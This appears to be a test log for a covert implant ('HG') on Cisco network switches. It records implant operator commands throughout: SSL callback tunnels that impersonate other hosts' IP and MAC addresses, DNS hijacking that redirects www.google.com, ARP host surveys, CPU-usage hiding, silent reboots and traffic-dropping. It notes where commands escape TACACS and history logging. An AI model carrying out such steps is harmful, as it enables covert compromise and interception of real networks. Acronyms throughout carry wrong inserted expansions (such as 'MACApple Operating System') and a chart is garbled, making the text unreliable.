For Follow-Up

Need to compare files from CIConcern Profile tests
Five second CPU peaks are lower with HG installed than without - ~7-8% versus 11-13% - evident on show proc cpu hist.  Confirmed that this does not occur with just IACInternational Access Code installed.  In the chart below, on the right was when switch booted up, I installed IACInternational Access Code at the 67% User #75209, and I installed HG at the 24% User #75210.  After that it, it stays at 7%.                                    1  211 1111111111111111 11611111111111111111    7777777777777727744281112221122111211722710122111110112211CPU% per minute (last 60 minutes)
CPU scaling does not seem to affect five second interrupt utilization
CPU scaling does not hide utilization on individual processes - can be evident from show proc cpu sorted that sum of processes below add up to more than total reported at top
SSHIAC attack logs an SNMPSimple Network Management Protocol trap for configuration change
Usability feedback - it is confusing that some modules are started and stopped by different names.  For example, "module stop ACE" will stop the ACEApplication Control Engine (Module) module, but "module start ACEMod.mod" starts.  Tunnel is the same way - "module stop Tunnel" to stop, but "module start CovertTunnel.mod" to start.
Scramble - output of "scramble status" shows more Matched Packets than we set - seems to count packets that are replies to traffic that was matched.

Remaining Tests

Auto Exfiltration tests
Covert Data Collection to Drop Point tests
DNS Check-in
Memory cloaking
Packet Collection to Drop Point
Packet scambler
RFS test
Redirection
Performance tests
Ad-hoc tests
Comms over other ports/protocols?
Do we need to test HG in Script Mode?

Smoke Test - ACEApplication Control Engine (Module) Capability

Set up for test - configured Target Device for use with AAASecurity Server from Cisco Server
Verified that Target Device is logging commands to AAASecurity Server from Cisco server log - /var/log/tac_plus.acct
Established CTCounter Terrorism session with HG
In trigger window, ran "capability show" which confirms ACEApplication Control Engine (Module) v24 is installed.
In trigger window, ran "module show" which confirms the same as above and that the module is "running".
In trigger window, issued "module restart default:ACE.mod" and received error stating that it was an invalid module name despite it being what showed in the previous output.
In trigger window, issued "module stop default:ACE.mod" and received the same error above.

ssh back to target 2960S and confirm that Tacacs logs the connection. Run "sh history" and verify no commands executed via HG show.
Load JQJThresher test on the IXIA which will run 85mbps of throughput through the test network that has 100mb link connecting the 3750G core and the 2960S for 10 minutes.During the IXIA throughput test, execute the "show" and other commands previously listedAll commands completed successfully. No output on Tacacs log or Show History on device.




Smoke test and functional Tunnel/Drillbit/Dualer capability

Establish Dualer tunner from 192.168.21.12 tap IP on 2960S to CT-ICON
Edit hg/tools/dualor/config/dualor-endpoint.ini
Change General Int to "eth0",
Change Trigger IP to real to be a destination for trigger packet: "192.168.21.10"
Ensure CommsH LocalPort = 444


Edit hg/tools/dualor/config/dualor-callback.ini
Change TapIPAddr to non-active IP on destination subnet = 192.168.21.12
Change VLANVirtual Local Area Network to destination vlan = 1
Change Remote = CTCounter Terrorism IP "172.20.12.22"
Ensure port = 444
Change IParams to impersonation IP = 192.168.21.10
Change IParams MACApple Operating System (MACApple Operating System of impersonation IP) = 00:50:56:88:25:6d
Change TTLTime To Live = 255
Change VLANVirtual Local Area Network to impersonation vlan = 1


Establish CTCounter Terrorism session to Aquament-5h instance on 2960S
Start tunnel listener on port 444 from workspace terminal
Run: hg/tools/dualor/linux# ./Dualor ../config/dualor-endpoint.iniNote: "Listening for clients on port 444..."

From CTCounter Terrorism listen window: tun init tools/dualor/config/dualor-callback.iniNote: Receive successful SSLSecure Socket Layer Handshake in workspace listener window on port 444 with tap0 interface on CTCounter Terrorism with impersonated IP

Add a route to ICON-CT for X.X.X.X (LVLT-GOGL-8-8-8[US])/24 to use tap0 interface - route add -net X.X.X.X (LVLT-GOGL-8-8-8[US])/24 dev tap0 (Gives CT-ICON session the ability to browse to website as 192.168.21.12)Note: TCPdump -i eth0 (From the X.X.X.XX (LVLT-GOGL-8-8-8[US]) webserver confirms source traffic as 192.168.21.12)



Trigger from another HG implanted switch back through the tunnel of the 2960S to CT-ICON on 192.168.21.12


Trigger and Callback through a HG Tunnel running Aquaman-3h on 2960(non S)
Confirmed 2960#1 running 12.2(50)SE5

Disabled setting in Aquaman-5h HG tunnel which will disable the tunnel if the tap IP becomes active (If necessary - only on version of HG that created tap0 interface. For this instance of the test, this does not need to be done)
Edit hg/config/tunnel.ini and change DetectTAPSrcTraffic=Yes to No
From hg/config run ./config-tunnel ../cfs/000000004B8FAF63.cfg and note output and DetectTAPSrcTraffic = Yes
From hg/config run ./config-tunnel ../cfs/000000004B8FAF63.cfg tunnel.ini and note in the output that DetectTAPSrcTraffic has been changed to No
From hg/config run ./config-tunnel ../cfs/000000004B8FAF63.cfg and note output and DetectTAPSrcTraffic = No
From Aquaman-3h CutThroat (Listen window), type file put cfs/000000004B8FAF63.cfg default:000000004B8FAF63.cfg in order to load the new setting up to HG

From Aquaman-3h CutThroat (Listen window), type module restart default:CovertTunnel.mod to restart the moduleThis did not work initially and Xetron is aware of this problem.  To fix, try restarting again, and run ilm refresh.



Implanted 2960#1 with Aquaman-3h delivery of HG
Edited "target aliases" file with 192.168.0.101 target and procid = 0x10413440
Edited "aquaman3h-txt to include:
General > Interface: tap0
Trigger address: 192.168.44.39
CommsH: Local port = 446


Established comms with Aquaman-3h from ICON-CT on port 446
ilm listen aquman-3h.txt (in listen window - listening on 446)
beacon call_me_back https 446 -ii 192.168.44.38 (in trigger window)
Successful SSLSecure Socket Layer handshake and established comms.
Verify tap0 traffic on Wireshark from CT-ICON







ARP Survey  - Smoke Test
Test the ability to collect host information
In CT-ICON Listen window: socket get_arp_survey_dataNote: HG collected a table of expected IP and associated MAC's

Listen window: socket clear_arp_survey_data= success

Listen window: socket get_arp_survey_dataNote: Less IP/MAC entries than previously since table is repopulating

Start IXIA JQJThresher test with 150 hosts in network neighborhoodcmd: socket get_arp_survey_data
= ARPAddress Resolution Protocol table is populated with IXIA traffic
Note: only the most recent 32 addresses show in the survey







CPU Scaling - Smoke Test

Ensured CPU scaling was disabled - device cpu show
Created a collect rule for all traffic to create high CPU and CPU interruptscollect create 0.0.0.0 0.0.0.0 0 0 0.0.0.0 0.0.0.0 0 0 tcp -en

Started IXIA traffic test to generate traffic to raise the COU
Noted CPU levelsCPU utilization for five seconds: 22%/11%; one minute: 14%; five minutes: 9%


Enabled CPU scaling and noted CPU levels

device cpu set_bounds 5 10
CPU utilization for five seconds: 5%/13%; one minute: 5%; five minutes: 5%




Found that CPU scaling does not seem to affect the second number for the 5 second CPU (the interrupt level).  I believe this is a known issue, but need to double check.
Found that the output of a show proc cpu sorted reveals that the sum total of the CPU used is more than the total being reported at the top.  I believe this is a known issue, but need to double check.



CA - Smoke Test


Issued "ca reboot" in ICON-CT

Target Device rebooted
Target Device reports in show version output: Last reset from power-on and System returned to ROMRead-Only Memory by power-on
No crashinfo file generated
No alerting snmp traps or syslogs on console during reboot


Issued a ca reboot while ca soft kill was in effect - no alerting snmp traps or syslog messages generated, target device reloaded



CA Soft Kill test

Issued "ca kill soft 5 60"
ICMP packets were dropped for the duration of the soft kill and resumed normally
CT session remained responsive
No alerting syslog messages seen on console
Packets resumed passing on schedule


Issued "ca soft kill 5 300"
reloaded Target Device during kill duration, device reloaded normally
Re-attacked with sshiac and installed HG and established CTCounter Terrorism session- snmp trap for config change observed during IACInternational Access Code attack
snmp traps all enabled with the exception of syslog traps, traps enabled to be sent to Solarwinds
SSHIAC attack and observe the SNMPSimple Network Management Protocol message:CISCO-CONFIG-MAN-MIB:ciscoConfigManEvent 







Smoke Test - socket get_arp_responder_status

Established a CTCounter Terrorism session using seeds host as trigger and then verified that arp responder was enabled but not used for current connection
Disconneced CTCounter Terrorism session and took seeds host offline
Restablished CTCounter Terrorism session with snooping and checked the arp responder activity - it was still not used
Disconnected CTCounter Terrorism session and cleared arp on Target Device and reconnected CTCounter Terrorism session - it still was not used
Disconnected CTCounter Terrorism session and attempted to reestablish and force it to use a non existent host to impersonate - would not connect
attempted both beacon_call_me_back and beacon_call_base_back with -ii 192.168.21.40
wireshark shows HG attempt to make an ssl cx to CT, CTCounter Terrorism sends 4 syn-acks, then HG sends another SYN
Is arp responder not getting the arp request or not responding for 192.168.21.40?
Cleared arp on 2960#1 as well as upstream 3750, and now using Seeds host IP no longer works for CTCounter Terrorism session
Turned up seeds host interface and sent a ping to it from the 3750 and then the interface on Seeds back down - this repopulated the 3750 arp table with and entry for 192.168.21.10
Attempted to establish CTCounter Terrorism session impersonating 192.168.21.10 and it works
Cleared arp on 3750 while CTCounter Terrorism session was active, and the session drops.  Turned int on Seeds back up and tried to reestablish CTCounter Terrorism session impersonating seeds IP and it works.
Seems that arp_responder isn't responding for 192.168.21.10


Attempted to connect a CTCounter Terrorism session and force HG to impersonate a real host - works
Allowed HG to snoop to impersonate traffic, but disabled seeds host interface eth1 and cleared arp on 3750 before attempting to establish the CTCounter Terrorism session.  Session established using ARPAddress Resolution Protocol responder.  Repeated this test using both beacon call_me_back https 172.20.12.22 443 and beacon call_me_back https 443 - sessions both established using ARPAddress Resolution Protocol responder.



DIVRT Smoke Test

Created a DIVRTDigital Imaging & Video Recovery Team rule in HGmitm create dns_replace_ip 192.168.21.11 255.255.255.0 4.4.4.4 255.255.255.0 www.google.com:172.20.13.20 -en -ttl 1

Tested from 192.168.21.11 (windex target) and saw that DNSDomain Name System responses were modified to reply with 172.20.13.20.  Captured in wireshark and verified the modified DNSDomain Name System reply, used web browser and received the web page from 172.20.13.20 when browsing to www.google.com

Added an additional rule for the same DNSDomain Name System request, but with a different modified response - behaved as iframe did - both rules were accepted however only lowest numbered rule took effect.
Deleted lowest numbered rule and now the remaining rule took effect
Attempted to delete the mitm rule while a session was active, HG gave an error to say a session was active, the rule will be deleted when all sessions are complete.
Verified that after session was complete, rule was deleted.
Stopped and started FilterBroker module, and then re-entered rule.  Verified rule still taking effect on Victim.
Disabled and deleted mitm rule



MixMaster

scramble create random_data 192.168.21.10 255.255.255.0 0 0 0.0.0.0 0.0.0.0 0 0 tcp -en
Observed seed traffic impacted by scramble rule at times, however the results we got were not consistent.  Need to continue testing scramble to determine why at times a rule that should have worked did not fire.  Could be related to IXIA traffic or number of rules.
Observed matched packets in output of scramble status to be too high - looks like it's counting return traffic as well as traffic that matches our rule
